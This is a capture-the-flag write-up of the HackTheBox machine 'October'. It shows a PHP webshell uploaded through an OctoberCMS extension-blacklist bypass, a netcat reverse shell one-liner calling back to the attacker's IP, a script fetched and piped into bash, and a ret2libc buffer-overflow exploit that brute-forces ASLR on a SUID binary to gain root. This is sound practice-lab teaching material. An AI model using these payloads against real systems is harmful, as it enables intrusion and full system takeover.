---
title: HTB: October
url: https://0xdf.gitlab.io/2019/03/26/htb-october.html
date: 2019-03-26T08:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-october, webshell, ubuntu, linux, bof, exploit, upload, nmap, aslr, aslr-bruteforce, htb-frolic, oscp-plus-v1, oscp-plus-v2
---

![October-cover](https://0xdfimages.gitlab.io/img/october-cover.png)

October was interesting because it paired a very straight-forward initial access with a simple buffer overflow for privesc. To gain access, I’ll learn about a extension blacklist by pass against the October CMS, allowing me to upload a webshell and get execution. Then I’ll find a SetUID binary that I can overflow to get root. While the buffer overflow exploit was on the more straight-forward side, it still requires a level of skill beyond many of the other easy early boxes I’ve done so far.

## Box Info

| Name | [October](https://hackthebox.com/machines/october)  [October](https://hackthebox.com/machines/october) [Play on HackTheBox](https://hackthebox.com/machines/october) |
| --- | --- |
| Release Date | 20 Apr 2017 |
| Retire Date | 26 May 2017 |
| OS | Linux Linux |
| Base Points | ~~Hard [40]~~ Medium [30] |
| Rated Difficulty | Rated difficulty for October |
| Radar Graph | Radar chart for October |
| First Blood User | 00:40:06[vagmour vagmour](https://app.hackthebox.com/users/82) |
| First Blood Root | 4 days21:35:14[arkanoid arkanoid](https://app.hackthebox.com/users/84) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` points towards web exploitation for initial access:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.16
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-08 16:27 EST
Nmap scan report for 10.10.10.16
Host is up (0.018s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds

root@kali# nmap -sV -sC -p 22,80 -oA scans/scripts 10.10.10.16
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-08 16:27 EST
Nmap scan report for 10.10.10.16
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds

```

Based on the [Apache version](https://packages.ubuntu.com/search?keywords=apache2) this box looks like Ubuntu 14.04.

### October CMS - TCP 80

#### Site

The site an empty site running [OctoberCMS](https://octobercms.com/):

![](https://0xdfimages.gitlab.io/img/octobercms-root.png)

#### Admin Login

In reading about the CMS, I learned that the CMS is [administered through `/backend`](https://octobercms.com/forum/post/how-do-i-access-the-backend), and that the [default username and password is admin / admin](https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name). Visiting `/backend` takes me to `http://10.10.10.16/backend/backend/auth/signin` where I get a sign-in page:

![1552133020412](https://0xdfimages.gitlab.io/img/1552133020412.png)

And the default creds get me in:

![1552133047453](https://0xdfimages.gitlab.io/img/1552133047453.png)

## Shell as www-data

### Upload Filter Bypass

There are [write-ups on exploit-db](https://www.exploit-db.com/exploits/41936) about how to upload php code into OctoberCMS. Basically, it blacklists php uploads by extension:

```

106 <?php
107 protected function blockedExtensions()
108 {
109         return [
110                 // redacted
111                 'php',
112                 'php3',
113                 'php4',
114                 'phtml',
115                 // redacted
116         ];
117 }

```

But `php5` is a valid php extension, so I can upload a shell as that.

If I go to the media tab, I’ll see the “Upload” button:

![1552133490763](https://0xdfimages.gitlab.io/img/1552133490763.png)

I’ll upload a simple webshell, `<?php system($_REQUEST['cmd']); ?>` as `cmd.php5`:

![1552133537262](https://0xdfimages.gitlab.io/img/1552133537262.png)

### Webshell

The link on the left gives the public url of `http://10.10.10.16/storage/app/media/cmd.php5`, which I can visit with a `?cmd=id` at the end to prove execution:

```

root@kali# curl http://10.10.10.16/storage/app/media/cmd.php5?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

I can go to full shell with:

```

root@kali# curl http://10.10.10.16/storage/app/media/cmd.php5 --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f"

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.16.
Ncat: Connection from 10.10.10.16:40712.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade that to a solid shell through the standard process:
1. Use python to get a tty: `python -c 'import pty;pty.spawn("bash")'`
2. Background shell with ctrl+z
3. `stty raw -echo`
4. `fg` (terminal will look funky)
5. `reset`
6. If asked for terminal type, enter screen.

```

$ python -c 'import pty;pty.spawn("bash")'
www-data@october:/var/www/html/cms/storage/app/media$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo
root@kali# nc -lnvp 443   # I typed fg enter
                                     reset     # now i type reset
reset: unknown terminal type unknown
Terminal type? screen  # i typed screen
     
www-data@october:/var/www/html/cms/storage/app/media$

```

From here, I can also grab `user.txt`:

```

www-data@october:/home/harry$ cat user.txt 
29161ca8...

```

## Privesc to root

### Enumeration

I’ll use [LinEnum.sh](https://github.com/rebootuser/LinEnum) to run basic enumeration across the host. I like to run with thorough tests, so either with `-t`, or just by adding `thorough=1` to the source.

I’ll service it with `python3 -m http.server 80`, and then get it from target:

```

www-data@october:/home/harry$ curl -s http://10.10.14.14/LinEnum.sh | bash

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.95

[-] Debug Info
[+] Thorough tests = Enabled

Scan started at:
Sat Mar  9 14:34:48 EET 2019

### SYSTEM ##############################################
[-] Kernel information:
Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 i686 i686 GNU/Linux
...[snip]...
[-] SUID files:
-rwsr-xr-x 1 root root 67704 Nov 24  2016 /bin/umount
-rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 30112 May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root root 35300 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 88752 Nov 24  2016 /bin/mount
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 156708 Oct 14  2016 /usr/bin/sudo
-rwsr-xr-x 1 root root 30984 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 44620 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 66284 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr
-rwsr-xr-x 1 root root 35916 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
-rwsr-xr-- 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
-rwsr-sr-x 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd
-rwsr-xr-x 1 root root 7377 Apr 21  2017 /usr/local/bin/ovrflw
...[snip]...

```

The output is quite long, but the SUID binary section jumps out at me, specifically `/usr/local/bin/ovrflw`.

If I run the program without arguments, it tells me to input a string:

```

www-data@october:/usr/local/bin/$ ./ovrflw
Syntax: ./ovrflw <input string>

```

If I pass in a short string, the program doesn’t do anything. If I pass in 500 As, it seg faults:

```

www-data@october:/usr/local/bin/$ ./ovrflw AAAAAAAAAA
www-data@october:/usr/local/bin/$ ./ovrflw $(python -c 'print "A"*500')
Segmentation fault

```

Seg fault is a good indications that I should look into a buffer overflow.

### ovrflw Protections

First, I’ll check ASLR on the host. I can see from `/proc/sys/kernel/randomize_va_space` that it is on. I can also see that when I run `ldd` on the binary, the libc address changes each time:

```

www-data@october:/home/harry$ cat /proc/sys/kernel/randomize_va_space 
2

www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw | grep libc  
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b1000)
www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb763b000)
www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7606000)
www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7626000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7591000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7624000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7558000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7567000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75ac000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75ab000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7609000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75d6000)
www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb758d000)

```

I’ll bring the binary back to my host (I can drop a copy in a web folder and download it), and then look for additional protections:

```

root@kali# checksec ovrflw
[*] '/media/sf_CTFs/hackthebox/october-10.10.10.16/ovrflw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

NX means that I can’t run shellcode from the stack, which is where I can write.

I recently did an introduction to Return to libc attacks in the [Frolic write-up](/2019/03/23/htb-frolic.html). The big difference here is that ASLR is enabled. However, if I look at the `ldd` output, I’ll notice that the address is really only changing between `0xb7500000` and `0xb76ff000`. It looks like at most one byte plus one bit are changing, or nine bits, or 512 options. That means if I guess once, I have a (511/512)1 = 99.8% chance of failure, or a 1 - (511/512)1 = 0.2% chance of success. But if I try 500 times, I have a 1 - (511/512)500 = 62.38% chance of success. After 1000 guesses, I have a 1 - (511/512)1000 = 85.84% chance of succeeding. And since there’s nothing to stop me from calling the program over and over again. I’ll go that route.

### ovrflw Find Offset

First thing I need to do is to find the offset to EIP in my input. I’ll open the binary with `gdb`, and I have my `gdb` set to automatically load [PEDA](https://github.com/longld/peda).

```

root@kali# gdb -q ./ovrflw
Reading symbols from ./ovrflw...(no debugging symbols found)...done.
gdb-peda$

```

I’ll use `pattern_create` (part of PEDA, also available as a stand-alone binary from Metasploit) to create a non-repeating pattern 500 long. I’ll pass that into the program and run it:

```

gdb-peda$ pattern_create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd3e0 ("As6A")
EDX: 0xffffd0fc ("As6A")
ESI: 0xf7f99000 --> 0x1d9d6c 
EDI: 0xf7f99000 --> 0x1d9d6c 
EBP: 0x6941414d ('MAAi')
ESP: 0xffffcf80 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"...)
EIP: 0x41384141 ('AA8A')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41384141
[------------------------------------stack-------------------------------------]
0000| 0xffffcf80 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"...)
0004| 0xffffcf84 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"...)
0008| 0xffffcf88 ("AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%"...)
0012| 0xffffcf8c ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O"...)
0016| 0xffffcf90 ("PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA"...)
0020| 0xffffcf94 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"...)
0024| 0xffffcf98 ("AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%Q"...)
0028| 0xffffcf9c ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41384141 in ?? ()

```

I see that the program crashed at `0x41384141` from the message at the bottom. I’ll see this same value in the EIP register if I look up a bit:

```

EIP: 0x41384141 ('AA8A')

```

I can feed that value, either as hex or as a string, into `pattern_offset` to get the offset in my buffer to the address that overwrites EIP:

```

gdb-peda$ pattern_offset AA8A
AA8A found at offset: 112
gdb-peda$ pattern_offset 0x41384141
1094205761 found at offset: 112

```

I can show this works by running:

```

gdb-peda$ run `python -c 'print "A"*112 + "BBBB"'`

```

That will input 112 As, and then 4 Bs. It crashes:

```

Stopped reason: SIGSEGV
0x42424242 in ?? ()

```

The address is 0x42424242, which is BBBB.

### ovrflw Ret to libc

I’ll find an address of libc:

```

www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75f8000)

```

And I can get offsets for system, exit, and bin/sh:

```

www-data@october:/dev/shm$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
www-data@october:/dev/shm$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
 162bac /bin/sh
 164b10 /bin/csh

```

For this libc base (which is right 1/512 times):

```

exit: 0xb75f8000+0x33260 = 0xB762B260
system: 0xb75f8000+0x40310 = 0xB7638310
/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC

```

I’m going to overflow such my buffer goes [JUNK] + SYSTEM (ret address overwrite) + EXIT (next return address) + “/bin/sh” (args).

### Exploit

If ASLR weren’t enabled, I could just do this:

```

www-data@october:/dev/shm$ /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"');

```

Because ASLR is enabled, I’ll do it in a loop until I get a shell:

```

www-data@october:/dev/shm$ while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
*** Error in `/usr/local/bin/ovrflw': munmap_chunk(): invalid pointer: 0xbfeeae83 ***
Aborted (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Illegal instruction (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
# 

```

From there I can grab `root.txt`:

```

# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
6bcb9cff...

```